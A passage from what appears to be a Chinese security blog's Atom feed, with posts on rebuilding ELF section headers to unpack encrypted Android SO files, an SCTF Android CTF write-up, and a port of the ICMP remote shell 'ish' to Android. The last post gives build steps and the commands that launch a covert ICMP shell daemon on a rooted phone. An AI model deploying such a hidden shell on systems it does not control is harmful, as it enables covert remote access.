    rebuildSectionHeader(&amp;quot;.got&amp;quot;, shdr_addr, 119, SHT_PROGBITS, SHF_ALLOC | SHF_EXECINSTR, got_addr,
            (Elf32_Off)got_addr - 0x1000, gotsz, 0, 0, 4, 0);
    shdr_addr += sizeof(Elf32_Shdr);
}
else {

}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;根据开始贴的两篇帖子，可以知道__global_offset_table__之前和之后为不同的got结构，可能为：{.got, .got.plt}、{.got.plt, .got}中的一种，并且.got.plt与.rel.plt一一对应，.got中的项一定会出现在.rel.dyn中。&lt;br&gt;Step1: 读取 DT_PLTGOT,获取__global_offset_table__地址,记为:plt_got；&lt;br&gt;Step2: 读取 plt_got – 4 地址的数值,在.rel.dyn表中进行搜索。如果匹配,说明 GOT 结构式:{.got, .got.plt},转 3.1;否则为{.got.plt, .got}转 3.2；&lt;br&gt;Step3.1: 继续向前搜索(plt_got -= 4),直到没有在.rel.dyn匹配，从而确定.got起始地址；由于.got.plt与.rel.plt一一对应，所以plt_got之后的大小也可以确定，从而得到gotsz；&lt;br&gt;Step3.2: 同理由于.got.plt与.rel.plt一一对应，可以确定.got的起始位置，再对(plt_got += 4)地址的数值在.rel.dyn表中进行搜索，直到找到末尾位置。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;.got：addr = offset = got_addr; size = gotsz;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;.text，.ARM.extab，.rodata，.data，.bss，这几个节表均是通过节表之间的相对位置进行重建的，如果节表位置被diy过，则重建无效，两篇帖子已有介绍，不再详述&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;.shstrtab，这个节表也没什么好说的，按照上面重建的节表，直接重建即可&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;完整代码就不上了，写的太丑了，真是毫无美感。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;看雪上已经有好几个帖子讲述了这方面的原理了，也已经现成的dump工具，不过都没有开源出来，秉着学习的态度自己研究了下，最终实现了基于init_array加密的SO的脱壳。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SCTF上的一道Android题</title>
    <link href="http://ele7enxxh.com/SCTF-Write-Up-For-Android.html"/>
    <id>http://ele7enxxh.com/SCTF-Write-Up-For-Android.html</id>
    <published>2014-12-10T03:03:00.000Z</published>
    <updated>2016-03-23T06:31:17.000Z</updated>
    
    <content type="html">&lt;p&gt;本文为SCTF上的一道Android题的writeup。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;题目描述：&lt;br&gt;&lt;img src=&quot;/images/SCTF-Write-Up-For-Android_1.jpg&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Java层很简单，获取用户输入，然后调用native层的func函数，如果返回真则弹出FLAG。&lt;/li&gt;
&lt;li&gt;SO有反调试，在init段的_cxa_chk_fail函数中，调用了pthread_create函数创建了新线程，在新线程中进行了反调试检测（/proc/pid/wchan）,若检测到调试，则tempabc = “xctf”，m_y = 9;否则tempabc = “syc”，m_y = 6。而这两个变量都涉及到后面的算法部分，也就是说如果不知道这个反调试的地方，后面算法推出的FLAG始终是错误的。（巧妙之处就在于检测到调试器，并没有让程序直接退出，而是修改了程序算法的参数）&lt;/li&gt;
&lt;li&gt;算法没有用什么加密算法，就是异或、移位之类的，大概跟了下，不深究了。&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;本文为SCTF上的一道Android题的writeup。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>icmpsh for Android</title>
    <link href="http://ele7enxxh.com/Icmpsh-For-Android.html"/>
    <id>http://ele7enxxh.com/Icmpsh-For-Android.html</id>
    <published>2014-11-13T02:53:00.000Z</published>
    <updated>2016-03-23T06:30:56.000Z</updated>
    
    <content type="html">&lt;p&gt;前几天在freebuf上看到了一篇基于ICMP协议的shell：&lt;a href=&quot;http://www.freebuf.com/articles/system/50361.html，&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.freebuf.com/articles/system/50361.html，&lt;/a&gt;&lt;br&gt;看了下觉得挺有意思，所以就在网上找了个源码移植到了Android上。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;源码下载地址：&lt;a href=&quot;http://ncu.dl.sourceforge.net/project/icmpshell/ish/v0.2/ish-v0.2.tar.gz&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://ncu.dl.sourceforge.net/project/icmpshell/ish/v0.2/ish-v0.2.tar.gz&lt;/a&gt;&lt;br&gt;不过它是针对linux平台的，要在Android上应用需要稍做修改：&lt;br&gt;&lt;code&gt;修改源码中的&amp;quot;/bin/sh&amp;quot;为&amp;quot;/system/bin/sh&amp;quot;&lt;/code&gt;&lt;br&gt;修改Makefile文件：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;CC = gcc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;CFLAGS1 = -static -g -Wall&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;CFLAGS2 = -static -g -Wall -lsocket&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;STRIP = strip&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;default:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	@echo &amp;quot;-------------------------------&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	@echo &amp;quot;Make with the OS from the list:&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	@echo &amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	@echo &amp;quot;1.) linux&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	@echo &amp;quot;2.) bsd&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	@echo &amp;quot;3.) solaris&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	@echo &amp;quot;4.) android&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	@echo &amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	@echo &amp;quot;ex: make bsd&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	@echo &amp;quot;-------------------------------&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;clean:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	/bin/rm -f ish ishd&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;linux:	clean cc1 fin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bsd:	clean cc1 fin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;solaris:    clean cc2 fin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;android:    clean cc3 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cc1:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	$(CC) $(CFLAGS1) -o ish ish.c ish_main.c&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	$(CC) $(CFLAGS1) -o ishd ishd.c ish_main.c ish_open.c&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cc2:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	$(CC) $(CFLAGS2) -o ish ish.c ish_main.c&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	$(CC) $(CFLAGS2) -o ishd ishd.c ish_main.c ish_open.c&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cc3:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	arm-linux-gnueabi-gcc $(CFLAGS1) -o ish-arm ish.c ish_main.c&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	arm-linux-gnueabi-gcc $(CFLAGS1) -o ishd-arm ishd.c ish_main.c ish_open.c&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;fin:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	$(STRIP) ish&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	$(STRIP) ishd&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;其实就是添加了一个Android的交叉编译选项，并且添加了-static选项。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cd ISHELL-v0.2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;make android&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;make linux&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;编译完成后得到四个文件：&lt;br&gt;&lt;code&gt;ish ishd ish-arm ishd-arm&lt;/code&gt;&lt;br&gt;将ishd-arm push到手机中，并赋予可执行权限&lt;br&gt;Android端运行：&lt;br&gt;&lt;code&gt;su -c ishd-arm -d&lt;/code&gt;&lt;br&gt;Linux端运行(将ip换成你手机的ip地址)：&lt;br&gt;&lt;code&gt;sudo ish ip&lt;/code&gt;&lt;br&gt;大功告成！&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;前几天在freebuf上看到了一篇基于ICMP协议的shell：&lt;a href=&quot;http://www.freebuf.com/articles/system/50361.html，&quot;&gt;http://www.freebuf.com/articles/system/50361.html，&lt;/a&gt;&lt;br&gt;看了下觉得挺有意思，所以就在网上找了个源码移植到了Android上。
    
    </summary>
    
    
  </entry>
  
</feed>
